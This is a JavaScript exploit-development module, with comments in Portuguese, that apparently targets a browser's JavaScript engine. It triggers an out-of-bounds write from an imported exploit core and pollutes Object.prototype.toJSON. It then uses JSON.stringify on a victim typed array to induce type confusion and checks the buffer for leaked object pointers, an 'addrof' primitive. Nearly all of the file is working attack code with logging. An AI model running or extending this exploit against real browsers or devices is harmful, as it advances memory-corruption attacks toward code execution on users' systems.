// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v23_ReFocusOnThisConfusedObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO = "OriginalHeisenbug_TypedArrayAddrof_v23_ReFocusOnThisConfusedObject";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const AGGRESSIVE_WRITE_COUNT_V23 = 16; // Reduzido para evitar lentidão excessiva nos logs

let object_to_leak_A_v23 = null;
let object_to_leak_B_v23 = null;
let victim_typed_array_ref_v23 = null; 
let probe_call_count_v23 = 0;
let last_probe_details_v23 = null; 
const PROBE_CALL_LIMIT_V23 = 5;


function toJSON_TA_Probe_ReFocus() {
    probe_call_count_v23++;
    const call_num = probe_call_count_v23;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v23_ReFocusOnThisConfusedObject",
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array: (this === victim_typed_array_ref_v23),
        this_had_victim_ref_prop: false,
        writes_on_confused_this_attempted: false,
        writes_on_this_victim_ref_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictimArray? ${current_call_details.this_is_victim_array}.`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V23) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit exceeded. Returning simple object.`, "warn");
            last_probe_details_v23 = current_call_details;
            return { recursion_stopped_v23: true };
        }

        if (call_num === 1 && current_call_details.this_is_victim_array) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim_array. Returning marker object with victim reference.`, "info");
            last_probe_details_v23 = current_call_details;
            // Retornar um objeto que CONTÉM a vítima.
            return { 
                probe_marker_v23: call_num, 
                victim_in_marker: victim_typed_array_ref_v23 // Referência à vítima
            };
        } else if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictimArray? ${current_call_details.this_is_victim_array})`, "vuln");
            
            // Verificar se este 'this' confuso é o objeto marcador que retornamos
            if (this && this.probe_marker_v23 === (call_num - 1) && this.hasOwnProperty('victim_in_marker')) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Confused 'this' IS the marker object from call #${call_num - 1}.`, "info");
                current_call_details.this_had_victim_ref_prop = true;
                
                logS3(`   Attempting AGGRESSIVE writes on this.victim_in_marker (the original victim)...`, "warn");
                try {
                    for (let i = 0; i < AGGRESSIVE_WRITE_COUNT_V23; i++) {
                        this.victim_in_marker[i] = (i % 2 === 0) ? object_to_leak_A_v23 : object_to_leak_B_v23;
                    }
                    current_call_details.writes_on_this_victim_ref_attempted = true;
                    logS3(`   Aggressive writes to this.victim_in_marker completed.`, "info");
                } catch (e_victim_write) {
                    logS3(`   ERROR during aggressive writes to this.victim_in_marker: ${e_victim_write.message}`, "error");
                    current_call_details.error_in_probe += ` VictimWriteErr: ${e_victim_write.message};`;
                }
            } else {
                 logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Confused 'this' is not the expected marker object, or victim_in_marker missing. Standard writes on 'this'.`, "warn");
            }
            
            // Ainda tentar escritas no 'this' confuso, independentemente de ser o marcador
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempting standard addrof writes on this confused 'this' itself...`, "warn");
            if (object_to_leak_A_v23) this[0] = object_to_leak_A_v23; // Chave "0"
            if (object_to_leak_B_v23) this["propB"] = object_to_leak_B_v23; // Chave "propB" para diferenciar
            current_call_details.writes_on_confused_this_attempted = true;
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Standard writes to confused 'this' attempted.`, "info");
            
            last_probe_details_v23 = current_call_details;
            return { probe_marker_v23: call_num, victim_in_marker: this.victim_in_marker }; // Propagar a referência, se existir

        } else {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' (type: ${current_call_details.this_type}) is not victim and not [object Object].`, "warn");
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `OuterProbeErr: ${e.name}: ${e.message}`;
    }
    
    last_probe_details_v23 = current_call_details;
    return { probe_marker_v23: call_num, generic_v23: true }; 
}

export async function executeTypedArrayVictimAddrofTest_ReFocusOnThisConfusedObject() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ReFocusOnThisConfusedObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO} Init...`;

    probe_call_count_v23 = 0;
    last_probe_details_v23 = null; 
    victim_typed_array_ref_v23 = null; 
    controller_object_ref_v21 = null; // Não usado mais, removido para evitar confusão
    object_to_leak_A_v23 = { marker: "ObjA_TA_v23rfcto", id: Date.now() }; 
    object_to_leak_B_v23 = { marker: "ObjB_TA_v23rfcto", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_last_probe_details_final = null; 
    
    let addrof_A = { success: false, msg: "Addrof A (victim_buffer[0]): Default" };
    let addrof_B = { success: false, msg: "Addrof B (victim_buffer[1]): Default" };
    // ... Poderíamos adicionar mais resultados para os índices do spam, se necessário
    const fillPattern = 0.23232323232323;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v23 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v23.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v23 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReFocus, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v23); 
            logS3(`  JSON.stringify completed. Stringify Output: ${JSON.stringify(stringifyOutput)}`, "info", FNAME_CURRENT_TEST);
            
            // Captura o estado final de last_probe_details_v23
            if (last_probe_details_v23) {
                captured_last_probe_details_final = JSON.parse(JSON.stringify(last_probe_details_v23)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugObservedInLastProbe = false;
            if (captured_last_probe_details_final && 
                captured_last_probe_details_final.this_type === "[object Object]") { // Corrigido para this_type
                heisenbugObservedInLastProbe = true;
            }
            
            logS3(`  EXECUTE: Heisenbug on 'this' of LAST probe call ${heisenbugObservedInLastProbe ? "CONFIRMED" : "NOT Confirmed"}. Last type: ${captured_last_probe_details_final ? captured_last_probe_details_final.this_type : 'N/A'}`, heisenbugObservedInLastProbe ? "vuln" : "error", FNAME_CURRENT_TEST);

            logS3("STEP 3: Checking victim buffer for addrof...", "warn", FNAME_CURRENT_TEST);
            // Apenas checar os primeiros dois para simplificar, mas o spam foi feito em mais.
            const val_A = float64_view_on_victim_buffer[0];
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }
            logS3(`  Value read from victim_buffer[0]: ${val_A} (${temp_A_int64.toString(true)})`, "leak");

            const val_B = float64_view_on_victim_buffer[1];
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }
            logS3(`  Value read from victim_buffer[1]: ${val_B} (${temp_B_int64.toString(true)})`, "leak");


            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO}: Addr? SUCESSO!`;
            } else if (heisenbugObservedInLastProbe) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v23}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v23 = null; 
        last_probe_details_v23 = null;
        probe_call_count_v23 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_last_probe_details_final, 
        total_probe_calls: probe_call_count_v23,
        addrof_A_attempt_result: addrof_A,
        addrof_B_attempt_result: addrof_B,
    };
}
